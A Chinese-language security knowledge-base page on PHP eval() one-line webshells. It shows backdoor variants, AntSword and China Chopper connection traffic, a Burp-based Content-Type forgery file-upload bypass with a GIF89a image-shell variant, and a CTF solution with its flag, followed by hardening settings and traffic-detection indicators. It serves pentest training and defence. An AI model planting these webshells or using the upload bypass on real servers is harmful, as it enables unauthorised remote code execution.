---
title: PHP Webshell 基础：eval() 一句话木马原理、蚁剑/菜刀连接演示与 Content-Type 绕过上传实战
description: 系统梳理 PHP 一句话木马基于 eval() 的核心执行原理，完整演示蚁剑与中国菜刀客户端连接流程与数据包解析，详细记录利用 Content-Type
  伪造绕过前端上传检测的实战细节，补充攻防世界 Webshell 实战案例（默认密码 shell 的 PHP 一句话木马通过中国菜刀连接获取 Flag 的完整流程），构建
  Webshell 入门实战知识体系。
category: program-analysis
tags:
- PHP
- Webshell
- 一句话木马
- eval
- 蚁剑
- AntSword
- 中国菜刀
- China Chopper
- Content-Type 绕过
- 文件上传
- 渗透测试
- 后门分析
- 攻防世界
date: '2024-07-15'
updated: '2026-11-14'
---
## 概述

Webshell（网页后门）是攻击者在目标服务器植入的脚本文件，通过 HTTP 请求实现远程代码执行与持久化控制。PHP 环境下最经典、最基础的形态是 **基于 `eval()` 的一句话木马**。本页面围绕该核心原理，结合归档实战文章，从 **函数机制 → 后门构造 → 客户端连接演示（蚁剑/中国菜刀） → 上传绕过技巧 → 实战案例（攻防世界） → 防御检测** 六个维度展开，旨在为渗透测试入门、CTF Web 题目分析、应急响应溯源提供结构化知识基础。

> 关联页面：[[php-webshell-fundamentals-chopper-analysis]]（中国菜刀连接流程深度解析）、[[php-webshell-obfuscation-av-evasion]]（Webshell 混淆与免杀进阶）、[[attack-defense-world-beginner-web-writeup]]（攻防世界 Web 新手练习区完整解题报告）

---

## 一、核心原理：`eval()` 函数与一句话木马构造

### `eval()` 执行机制

| 特性 | 说明 |
|------|------|
| **函数签名** | `eval(string $code): mixed` |
| **核心作用** | 将字符串 `$code` 作为 PHP 代码解析执行 |
| **语法要求** | 字符串必须是**合法 PHP 代码**，且**以分号结尾** |
| **返回值** | 若代码中有 `return` 则返回该值；无 `return` 返回 `NULL`；解析错误返回 `false` |
| **错误抑制** | 常配合 `@` 使用：`@eval(...)` 隐藏 Warning/Notice |

> **关键点**：`eval()` 是语言结构而非函数，无法被 `disable_functions` 直接禁用（但可通过 Suhosin/Hardening Patch 等扩展限制）。

### 最简一句话木马

```php
<?php @eval($_POST['cmd']); ?>
```

- **参数名** `cmd` 可自定义（常见：`c`、`shell`、`code`、`x` 等）
- **请求方式** 必须为 **POST**，避免 URL 日志记录完整代码
- **执行示例**  
  发送 `cmd=system('id');` → 服务端执行 `system('id')` 并回显当前用户 UID/GID

### 变种与演进

| 变种 | 代码示例 | 说明 |
|------|----------|------|
| **GET 型** | `<?php @eval($_GET['cmd']); ?>` | 便于测试，实战易被 WAF/日志审计 |
| **assert 型（PHP ≤ 7.1）** | `<?php @assert($_POST['cmd']); ?>` | `assert()` 早期支持字符串代码执行，PHP 7.2+ 移除 |
| **动态函数名** | `<?php $f='eval'; @$f($_POST['cmd']); ?>` | 绕过简单关键字匹配 |
| **编码/加密载荷** | `eval(base64_decode($_POST['c']));` | 配合客户端自动编码，对抗流量特征匹配 |

---

## 二、实战演示：蚁剑连接全流程复现

### 实验环境

| 组件 | 版本/配置 |
|------|-----------|
| **目标靶机** | PHP 7.4 + Apache/Nginx，已上传 `shell.php` |
| **后门文件** | `<?php @eval($_POST['cmd']); ?>`，密码参数 `cmd` |
| **管理客户端** | **蚁剑** v2.1.x（开源、跨平台、插件化） |
| **抓包分析** | Burp Suite / Wireshark |

### 蚁剑新建连接配置

1. 打开蚁剑 → 右键 “新增数据” → 填写：
   - **URL**：`http://target/shell.php`
   - **密码**：`cmd`（与后门 `$_POST` 键名一致）
   - **编码器**：`PHP::Base64`（默认开启，流量特征 Base64 化）
2. 点击 “测试连接” → 成功后进入虚拟终端 / 文件管理界面

### 连接建立阶段数据包解析

#### 原始请求（URL 编码后）
```http
POST /shell.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
User-Agent: antSword/v2.1
Connection: close

cmd=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTsKQHNldF90aW1lX2xpbWl0KDApOwokZCA9IGRpcm5hbWUoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKTsKaWYgKCRkID09ICIiKSAkZCA9IGRpcm5hbWUoJF9TRVJWRVJbJ1BBVEhfVFJBTlNMQVRFRCddKTsKJHJldCA9ICIiOwokcmV0IC49ICJ7JGR9XHQiOwppZiAoc3Vic3RyKCRkLCAwLCAxKSAhPSAiLyIpIHsKICBmb3JlYWNoIChyYW5nZSgnQScsICDaJykgYXMgJGwpIHsKICAgIGlmIChpc19kaXIoIiRseTovIikpIHsKICAgICAkcmV0IC49ICIke2x9OiI7CiAgICB9CiAgfQp9IGVsc2UgewogICRyZXQgLj0gIi9cdCI7Cn0KJHJldCAuPSBw
```

#### 两次解码还原

**Step 1：URL Decode** → 得到 Base64 字符串  
**Step 2：Base64 Decode** → 还原 PHP 代码：

```php
@ini_set("display_errors", "0");
@set_time_limit(0);
$d = dirname($_SERVER['SCRIPT_FILENAME']);
if ($d == "") $d = dirname($_SERVER['PATH_TRANSLATED']);
$ret = "";
$ret .= "{$d}\t";
if (substr($d, 0, 1) != "/") {
    foreach (range('A', 'Z') as $l) {
        if (is_dir("{$l}:\\")) {
            $ret .= "{$l}:";
        }
    }
} else {
    $ret .= "/\t";
}
$ret .= php_uname();
$ret .= "(".@get_current_user().")";
echo $ret;
```

#### 代码逻辑映射（与菜刀高度相似）

| 代码片段 | 功能 | 对应蚁剑界面字段 |
|----------|------|------------------|
| `ini_set("display_errors", "0")` | 关闭错误回显 | — |
| `set_time_limit(0)` | 移除执行时间限制 | — |
| `dirname($_SERVER['SCRIPT_FILENAME'])` | 获取当前脚本绝对目录 | **当前目录** |
| `substr($d,0,1)!="/"` 判断 + `range('A','Z')` 枚举盘符 | Windows 下列出可用盘符 | **盘符列表** |
| `php_uname()` | 获取操作系统内核信息 | **系统信息** |
| `get_current_user()` | 获取脚本运行用户 | **用户名** |

> **对比结论**：蚁剑初始化载荷与中国菜刀（China Chopper）核心逻辑一致，均为“探测环境 → 返回目录/盘符/系统/用户”四要素，仅编码器实现细节不同。

### 交互阶段：虚拟终端执行 `whoami`

请求体（Base64 解码后）：
```php
system("whoami");
```
响应体：`www-data` → 直接渲染在蚁剑终端窗口。

---

## 三、实战演示：中国菜刀连接全流程复现（攻防世界实战案例）

### 攻防世界 Webshell 挑战场景

> 来源：[[attack-defense-world-beginner-web-writeup]] 归档文章《攻防世界-答题-WEB-新手练习区》

| 项目 | 详情 |
|------|------|
| **靶场平台** | 攻防世界 |
| **题目分类** | Web 新手练习区 |
| **题目名称** | webshell |
| **提示信息** | index.php 里面有后门，采用 POST 提交，密码是 shell |
| **后门类型** | PHP `eval()` 一句话木马 |
| **连接工具** | **中国菜刀** |
| **预期 Flag** | `cyberpeace{0cb63f9c0ec1d91a7f9fc9ef7cb2ce0f}` |

### 后门代码分析

根据题目提示，目标服务器 `index.php` 中植入的后门代码为：

```php
<?php @eval($_POST['shell']); ?>
```

- **密码参数**：`shell`（对应 `$_POST['shell']`）
- **请求方式**：POST
- **执行函数**：`eval()`

### 中国菜刀连接配置步骤

#### 打开中国菜刀主界面
- 右键空白处 → “添加站点”
- 或点击工具栏 “站点管理” → “添加”

#### 填写连接参数
| 字段 | 值 | 说明 |
|------|-----|------|
| **站点 URL** | `http://target/index.php` | 靶场提供的目标地址 |
| **连接密码** | `shell` | 题目明文提示的密码参数名 |
| **编码方式** | 自动/默认 | 菜刀默认使用 UTF-8 编码 |
| **User-Agent** | 默认 | 可自定义伪装 |

#### 测试连接
- 点击 “测试连接” 按钮
- 状态栏显示 “连接成功” → 右侧面板出现虚拟文件管理器 / 虚拟终端

### 连接成功界面与 Flag 获取

根据归档文章截图记录：

1. **虚拟文件管理器** 显示目标服务器目录结构
2. **虚拟终端** 可直接执行系统命令
3. 在网站根目录或指定路径下发现 Flag 文件，或直接在终端执行 `cat flag.php` / `ls` 等命令获取
4. **最终 Flag**：`cyberpeace{0cb63f9c0ec1d91a7f9fc9ef7cb2ce0f}`

### 中国菜刀流量特征分析（对比蚁剑）

| 特征维度 | 中国菜刀 | 蚁剑 |
|----------|----------|------|
| **编码方式** | 默认不加密/可选 Base64 | 默认 Base64 编码器 |
| **初始化载荷** | 相似的环境探测代码 | 相似的环境探测代码 |
| **分隔符** | `->|` 和 `|<-` 包裹输出 | 直接输出，无固定分隔符 |
| **User-Agent** | 可自定义，默认含 "chopper" 特征 | `antSword/v2.x` |
| **参数名** | 可配置，默认 `z0`/`z1` 等 | 与后门参数名一致（如 `cmd`） |

> **溯源价值**：在流量分析中，若发现 POST 请求体含有 `->|` `|<-` 分隔符、参数名为短字符（`z0`/`z1`）、且响应体包含目录/系统/用户拼接信息，极大概率为中国菜刀连接行为。

---

## 四、实战绕过：Content-Type 伪造突破前端上传检测

### 漏洞成因分类

| 检测层面 | 常见实现 | 绕过核心思路 |
|----------|----------|--------------|
| **前端 JS** | `file.type === 'image/jpeg'` 校验后缀/MIME | 禁用 JS、修改 JS、直接发包绕过浏览器 |
| **后端 Content-Type** | `$_FILES['file']['type'] === 'image/jpeg'` | **伪造 HTTP 请求头 `Content-Type: image/jpeg`** |
| **后端文件头魔数** | `file_get_contents` 读取前几字节校验 `FF D8 FF` | 构造 **GIF89a/ JPEG 合法文件头 + PHP 代码**（图片马） |
| **后端扩展名/路径** | 仅允许 `.jpg/.png`、重命名存储 | 利用解析漏洞（`.php.jpg`、`.htaccess`、Apache `AddHandler`） |
| **后端二次渲染/压缩** | GD/Imagick 重绘图片 | 寻找不重绘的上传点、或利用 PLTE/chunk 注入抗重绘 |

> 本节聚焦 **后端仅校验 `$_FILES['file']['type']`** 的典型低级过滤绕过。

### 实战复现步骤（基于归档文章场景）

#### 步骤 1：准备恶意文件
```bash
echo '<?php @eval($_POST["cmd"]); ?>' > shell.php
```

#### 步骤 2：Burp Suite 拦截上传请求
正常上传图片请求示例：
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXXX

------WebKitFormBoundaryXXX
Content-Disposition: form-data; name="file"; filename="test.jpg"
Content-Type: image/jpeg

<binary jpeg data>
------WebKitFormBoundaryXXX--
```

#### 步骤 3：篡改两处关键字段
1. **filename** → `shell.php`（或 `shell.php.jpg` 视后端逻辑）
2. **Content-Type** → `image/jpeg`（保持合法 MIME）
3. **文件内容** → 替换为 `<?php @eval($_POST["cmd"]); ?>`

篡改后：
```http
------WebKitFormBoundaryXXX
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php @eval($_POST["cmd"]); ?>
------WebKitFormBoundaryXXX--
```

#### 步骤 4：放包 → 获取 Webshell 路径
响应示例：
```json
{"code":200,"msg":"上传成功","path":"/uploads/20240715/shell.php"}
```

#### 步骤 5：蚁剑/菜刀连接验证
- URL：`http://target/uploads/20240715/shell.php`
- 密码：`cmd`（或 `shell` 视后门代码）
- 连接成功 → 拿到虚拟终端

> **归档文章截图佐证**：文章中展示的 Burp 修改 `Content-Type: image/jpeg` 与蚁剑连接成功界面，完整印证该绕过链路。

### 进阶变体：双重文件头（图片马）绕过魔数校验

```bash
# 生成合法 GIF 头 + PHP 代码
echo -en 'GIF89a<?php @eval($_POST["cmd"]); ?>' > shell.gif
```
上传时 `filename=shell.gif`、`Content-Type=image/gif`，若后端仅校验魔数与 MIME 且**未重绘**，可直接连接（需配合 `.htaccess` 或解析漏洞让 `.gif` 当 PHP 执行）。

---

## 五、防御检测与加固体系

### 代码层面加固

```ini
; php.ini 关键配置
disable_functions = eval,assert,system,exec,shell_exec,passthru,proc_open,popen,pcntl_exec,create_function
open_basedir = /var/www/html:/tmp:/var/tmp
display_errors = Off
log_errors = On
error_log = /var/log/php/error.log
file_uploads = On
upload_max_filesize = 10M
max_file_uploads = 5
```

### 上传功能安全清单

| 防御措施 | 实现要点 |
|----------|----------|
| **MIME 双重校验** | 同时检查 `$_FILES['type']` 与 `finfo_file()` 真实魔数 |
| **扩展名白名单** | 仅允许 `.jpg/.png/.pdf` 等，**严禁** `.php/.php5/.phtml/.phar` |
| **随机重命名存储** | `md5(uniqid()).'.jpg'`，去除原文件名可控性 |
| **存储目录不可执行** | Nginx/Apache 配置 `location ~ \.php$ { deny all; }` 或 `php_admin_flag engine off` |
| **二次渲染/压缩** | 使用 GD/Imagick `imagecreatefromjpeg()` 重绘，破坏注入代码 |
| **文件内容扫描** | 集成 ClamAV / 自定义规则扫描 `eval/assert/base64_decode` 等特征 |
| **WAF/IDS 规则** | 拦截 `Content-Type: image/.*` 但 Body 含 `<?php`/`eval` 的请求 |

### 流量侧检测特征

| 特征维度 | 典型 IOC |
|----------|----------|
| **请求头** | `User-Agent: antSword/v2.x`、`User-Agent: Chopper`、`Content-Type: application/x-www-form-urlencoded` |
| **请求体** | 单一参数（如 `cmd/c/shell/z0`）值为**长 Base64**，解码后含 `ini_set("display_errors"`、`set_time_limit(0)`、`php_uname()` |
| **响应体** | 含 `->|`/`|<-`（菜刀）或直接返回目录/系统信息/用户名拼接字符串 |
| **连接频率** | 短时间内同一 IP 对同一 URL 重复 POST，且参数名固定 |

---

## 六、关联知识页面交叉引用

- [[php-webshell-fundamentals-chopper-analysis]] — 中国菜刀连接流程深度解析，对比蚁剑异同
- [[php-webshell-obfuscation-av-evasion]] — Webshell 混淆免杀进阶：算术拆分、XOR 拆分、多态生成
- [[attack-defense-world-beginner-web-writeup]] — 攻防世界靶场 Web 新手练习区 11 道题目完整解题报告（含本 webshell 题目）
- [[edu-src-penetration-test-case-study]] — 实战案例：文件上传绕过 Getshell → 蚁剑连接全链路复现
- [[vulnhub-bbs-cute-102-writeup]] — CuteNews 头像上传绕过（GIF89a 头 + PHP）实战
- [[huxiangbei-willphp-file-inclusion-writeup]] — WillPHP 任意文件包含利用 pearcmd.php 写入 Webshell
- [[tctf-2021-1linephp-zip-include]] — `zip://` 协议包含临时文件 RCE，理解 PHP 伪协议攻击面
- [[race-condition-vulnerability-analysis]] — 条件竞争在文件上传场景的利用与防御
- [[cybersecurity-interview-guide-2022]] — 面试高频：Webshell 分类、菜刀/蚁剑/哥斯拉流量特征、上传绕过清单

---

## 七、小结与持续演进

本页面构建了 **PHP `eval()` 一句话木马 → 蚁剑/中国菜刀双客户端连接流量还原 → Content-Type 伪造上传绕过 → 攻防世界实战案例 → 防御体系** 的完整知识闭环。掌握该体系可支撑：

1. **快速识别**：通过流量特征（Base64 载荷、初始化代码模式、菜刀分隔符 `->|` `|<-`）定位 Webshell 连接行为
2. **实战复现**：在授权渗透/靶场练习中复现上传绕过 → 落地后门 → 客户端管理全链路
3. **加固对抗**：从代码审计、PHP 配置、中间件配置、WAF 规则四层面构建纵深防御
4. **知识迁移**：理解 `eval/assert` 代码执行本质，类比 Java `Runtime.exec()`、Python `eval/exec`、Node.js `vm.runInThisContext()` 等跨语言 Webshell 原理

> **演进提示**：
> - PHP 8.0+ 移除 `create_function`、废弃 `assert(string)`，但 `eval` 仍存；新型管理工具（**哥斯拉 Godzilla**、**冰蝎 Behinder**）采用 **AES 加密流量 + 动态密钥协商 + 内存马**，流量特征与本页面完全不同，需单独建立知识页面跟进。
> - 文件上传绕过已从单一 `Content-Type` 伪造演进至 **解析漏洞、条件竞争、中间件特性（Nginx `fastcgi_split_path_info`）、供应链污染** 等高阶技术，建议结合 [[race-condition-vulnerability-analysis]]、[[php-webshell-obfuscation-av-evasion]] 持续扩展。
> - 攻防世界等 CTF 靶场的 Webshell 题目通常考察基础连接与简单绕过，实战中需结合 [[php-webshell-obfuscation-av-evasion]] 理解免杀对抗演进。

## 来源

- [0x00实验室-202108-202304_042](../sources/0x00实验室-202108-202304_042.md)
- [0x00实验室-202108-202304_053](../sources/0x00实验室-202108-202304_053.md)
- [0x00实验室-202108-202304_081](../sources/0x00实验室-202108-202304_081.md)
